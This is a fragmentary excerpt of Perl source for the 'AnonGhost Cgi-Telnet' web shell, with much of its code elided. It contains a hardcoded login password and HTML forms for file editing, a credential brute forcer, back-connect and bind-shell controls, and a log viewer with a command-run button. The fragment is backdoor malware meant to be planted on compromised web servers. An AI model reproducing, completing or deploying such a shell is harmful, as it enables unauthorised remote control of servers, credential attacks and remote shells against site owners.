...
$EditPersion="AnonGhost";

$Password = "virusa";			# Change this. You will need to enter this
				# to login.
sub Is_Win(){
...
<title>AnonGhost Cgi-Telnet [ $Version ]</title>
$HtmlMetaHeader
</head>
<style>
body{
...
sub SaveFileForm
{
	...
	$save='<br><input name="a" type="submit" value="save" >';
	...
	<input name="s" type="submit" value="Enter">
...
<input type="submit" value="Brute Forcer"/></td></tr>
</form>
</table>
END
return $result;
...
sub BackBindForm
{
	...
	<td><input name="s" type="submit" name="submit" value="Connect"></td>
	</form>
	</tr>
	<tr>
	...
	<td><input name="s" type="submit" name="submit" value="Bind"></td>
	</form>
	</tr>
	<tr>
...
sub ViewLog
{
	...
	foreach my $log (@pathlog)
	{
		...
		<tr>
			...
			<td><input type="submit" value="Try" /></td>
			<input type="hidden" name="a" value="command" />
			<input type="hidden" name="d" value="$EncodeCurrentDir" />
			</form>
			<td>$perms</td>
